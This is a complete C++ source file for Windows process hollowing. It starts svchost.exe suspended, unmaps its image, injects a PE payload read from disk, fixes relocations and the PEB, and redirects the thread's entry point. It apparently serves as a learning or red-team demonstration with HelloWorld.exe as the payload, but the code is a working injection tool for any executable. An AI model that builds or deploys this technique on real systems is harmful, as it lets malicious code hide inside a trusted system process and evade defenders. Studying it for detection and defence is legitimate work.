#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

using namespace std;

#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI NtQueryInformationProcess(
	HANDLE ProcessHandle,
	UINT ProcessInformationClass,
	PVOID ProcessInformation,
	ULONG ProcessInformationLength,
	PULONG ReturnLength
);

extern "C" NTSTATUS NTAPI NtUnmapViewOfSection(
	HANDLE ProcessHandle,
	PVOID BaseAddress
);

typedef struct _PROCESS_BASIC_INFORMATION {
	PVOID Reserved1;
	PVOID PebBaseAddress;
	PVOID Reserved2[2];
	ULONG_PTR UniqueProcessId;							
	PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

struct Payload {
	BYTE* buffer = nullptr;
	DWORD bufferSize = 0;
	PIMAGE_DOS_HEADER dos = nullptr;
	PIMAGE_NT_HEADERS nt = nullptr;
};

static BOOL CreateSuspendedProcess(const wchar_t* targetPath, PROCESS_INFORMATION& pi)
{
	STARTUPINFOW si = { 0 };
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	return CreateProcessW(targetPath, NULL, NULL, NULL, FALSE,
		CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
}

static bool ReadPayloadFromFile(const wchar_t* payloadPath, Payload& out)
{
	HANDLE h = CreateFileW(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE) return false;
	DWORD size = GetFileSize(h, NULL);
	if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(h); return false; }
	out.buffer = new BYTE[size];
	out.bufferSize = size;
	DWORD read = 0;
	if (!ReadFile(h, out.buffer, size, &read, NULL) || read != size) {
		CloseHandle(h);
		delete[] out.buffer;
		out.buffer = nullptr;
		out.bufferSize = 0;
		return false;
	}
	CloseHandle(h);

	out.dos = (PIMAGE_DOS_HEADER)out.buffer;
	out.nt = (PIMAGE_NT_HEADERS)(out.buffer + out.dos->e_lfanew);
	return true;
}

static bool GetProcessBasicInfo(HANDLE hProcess, PROCESS_BASIC_INFORMATION& pbi)
{
	ULONG retLen = 0;
	NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &retLen);
	return status == 0;
}

static bool ReadRemoteImageBase(HANDLE hProcess, PVOID pebAddress, ULONG_PTR& imageBase)
{
	SIZE_T bytesRead = 0;
	// Sửa: x86 offset là 0x08, x64 là 0x10
#ifdef _WIN64
	LPVOID remoteAddr = (LPVOID)((uintptr_t)pebAddress + 0x10);
#else
	LPVOID remoteAddr = (LPVOID)((uintptr_t)pebAddress + 0x08);
#endif
	return ReadProcessMemory(hProcess, remoteAddr, &imageBase, sizeof(imageBase), &bytesRead);
}

static bool UpdateRemotePEBImageBase(HANDLE hProcess, PVOID pebAddress, LPVOID newBase)
{
	SIZE_T written = 0;
#ifdef _WIN64
	LPVOID remoteAddr = (LPVOID)((uintptr_t)pebAddress + 0x10);
#else
	LPVOID remoteAddr = (LPVOID)((uintptr_t)pebAddress + 0x08);
#endif
	return WriteProcessMemory(hProcess, remoteAddr, &newBase, sizeof(newBase), &written);
}

static bool UnmapExistingImage(HANDLE hProcess, ULONG_PTR imageBase)
{
	NTSTATUS status = NtUnmapViewOfSection(hProcess, (PVOID)imageBase);
	// non-zero indicates error; allow continuation but report
	if (status != 0) {
		cout << "NtUnmapViewOfSection returned status: 0x" << hex << status << dec << endl;
	}
	return true;
}

static LPVOID AllocateImageInTarget(HANDLE hProcess, PIMAGE_NT_HEADERS nt)
{
	LPVOID base = VirtualAllocEx(hProcess, (LPVOID)(nt->OptionalHeader.ImageBase),
		nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!base) {
		base = VirtualAllocEx(hProcess, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
	return base;
}

static bool WriteHeadersAndSections(HANDLE hProcess, LPVOID remoteBase, Payload& payload)
{
	SIZE_T written = 0;
	if (!WriteProcessMemory(hProcess, remoteBase, payload.buffer, payload.nt->OptionalHeader.SizeOfHeaders, &written)) return false;

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(payload.nt);
	for (int i = 0; i < payload.nt->FileHeader.NumberOfSections; i++, section++) {
		if (section->SizeOfRawData == 0) continue;
		LPVOID dest = (LPVOID)((uintptr_t)remoteBase + section->VirtualAddress);
		LPVOID src = payload.buffer + section->PointerToRawData;
		if (!WriteProcessMemory(hProcess, dest, src, section->SizeOfRawData, &written)) return false;
	}
	return true;
}

static void PerformRelocationsIfNeeded(HANDLE hProcess, LPVOID remoteBase, Payload& payload)
{
	DWORD_PTR delta = (DWORD_PTR)remoteBase - payload.nt->OptionalHeader.ImageBase;
	if (delta == 0) return;

	DWORD relocVA = payload.nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress; // Relocation Table Virtual Address 
	DWORD relocSize = payload.nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size; // Relocation Table Size
	if (!relocVA || !relocSize) return;

	PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(payload.buffer + relocVA); // Pointer to the first relocation block 
	PIMAGE_BASE_RELOCATION relocEnd = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + relocSize); // End of relocation table

	while ((BYTE*)reloc < (BYTE*)relocEnd && reloc->SizeOfBlock) { // Process each relocation block
		DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD); // Number of entries in this block
		PWORD entries = (PWORD)((BYTE*)reloc + sizeof(IMAGE_BASE_RELOCATION)); // Pointer to the first entry
		for (DWORD i = 0; i < count; ++i) {
			WORD entry = entries[i];
			WORD type = entry >> 12; // High 4 bits
			WORD offset = entry & 0x0FFF; // Low 12 bits
			if (type == IMAGE_REL_BASED_HIGHLOW || type == IMAGE_REL_BASED_DIR64) { // Process only HIGHLOW and DIR64 relocations
				ULONG_PTR patchAddr = (ULONG_PTR)remoteBase + reloc->VirtualAddress + offset;
				ULONG_PTR original = 0;
				SIZE_T br = 0;
				if (ReadProcessMemory(hProcess, (LPCVOID)patchAddr, &original, sizeof(original), &br) && br == sizeof(original)) {
					original += delta;
					WriteProcessMemory(hProcess, (LPVOID)patchAddr, &original, sizeof(original), NULL);
				}
			}
		}
		reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
	}
}



static bool FixThreadContextAndEntry(HANDLE hThread, LPVOID newBase, PIMAGE_NT_HEADERS nt)
{
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(ctx));
#ifdef _WIN64
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx)) return false;
	ctx.Rip = (DWORD64)((uintptr_t)newBase + nt->OptionalHeader.AddressOfEntryPoint);
#else
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx)) return false;
	ctx.Eip = (DWORD)((uintptr_t)newBase + nt->OptionalHeader.AddressOfEntryPoint);
#endif
	return SetThreadContext(hThread, &ctx) != 0;
}

BOOL ProcessHollowing(const wchar_t* targetProcessPath, const wchar_t* payloadProcessPath)
{
	PROCESS_INFORMATION pi = { 0 };
	if (!CreateSuspendedProcess(targetProcessPath, pi)) {
		cout << "CreateProcess failed. Error: " << GetLastError() << endl;
		return FALSE;
	}
	cout << "Created suspended process PID: " << dec << pi.dwProcessId << endl;

	// Read payload from disk
	Payload payload;
	if (!ReadPayloadFromFile(payloadProcessPath, payload)) {
		cout << "Failed to read payload file. Error: " << GetLastError() << endl;
		TerminateProcess(pi.hProcess, 0);
		return FALSE;
	}

	// Get target process basic info and image base from PEB
	PROCESS_BASIC_INFORMATION pbi;
	if (!GetProcessBasicInfo(pi.hProcess, pbi)) {
		cout << "NtQueryInformationProcess failed." << endl;
		delete[] payload.buffer;
		TerminateProcess(pi.hProcess, 0);
		return FALSE;
	}

	ULONG_PTR remoteImageBase = 0;
	if (!ReadRemoteImageBase(pi.hProcess, pbi.PebBaseAddress, remoteImageBase)) {
		cout << "ReadProcessMemory(peb->ImageBase) failed. Error: " << GetLastError() << endl;
		delete[] payload.buffer;
		TerminateProcess(pi.hProcess, 0);
		return FALSE;
	}

	// Unmap existing image
	UnmapExistingImage(pi.hProcess, remoteImageBase);

	// Allocate memory in target for payload
	LPVOID newBase = AllocateImageInTarget(pi.hProcess, payload.nt);
	if (!newBase) {
		cout << "VirtualAllocEx failed. Error: " << GetLastError() << endl;
		delete[] payload.buffer;
		TerminateProcess(pi.hProcess, 0);
		return FALSE;
	}
	cout << "Allocated remote image at: " << hex << newBase << dec << endl;

	// Write headers and sections
	if (!WriteHeadersAndSections(pi.hProcess, newBase, payload)) {
		cout << "WriteProcessMemory (headers/sections) failed. Error: " << GetLastError() << endl;
		delete[] payload.buffer;
		TerminateProcess(pi.hProcess, 0);
		return FALSE;
	}

	// Perform relocations if needed
	PerformRelocationsIfNeeded(pi.hProcess, newBase, payload);

	// Update PEB ImageBaseAddress
	if (!UpdateRemotePEBImageBase(pi.hProcess, pbi.PebBaseAddress, newBase)) {
		cout << "Warning: Failed to update remote PEB ImageBaseAddress. Error: " << GetLastError() << endl;
		// Not fatal; continue
	}

	// Fix thread context to point to new entry point
	if (!FixThreadContextAndEntry(pi.hThread, newBase, payload.nt)) {
		cout << "SetThreadContext failed. Error: " << GetLastError() << endl;
		delete[] payload.buffer;
		TerminateProcess(pi.hProcess, 0);
		return FALSE;
	}

	// Resume target thread
	ResumeThread(pi.hThread);

	// Clean up
	delete[] payload.buffer;
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return TRUE;
}

int main()
{
	const wchar_t* targetProcessPath = L"C:\\Windows\\SysWOW64\\svchost.exe";
	const wchar_t* payloadProcessPath = L"HelloWorld.exe";
	BOOL result = ProcessHollowing(targetProcessPath, payloadProcessPath);
	if (result) {
		cout << "Process hollowing succeeded." << endl;
	}
	else {
		cout << "Process hollowing failed." << endl;
	}
	return 0;
}


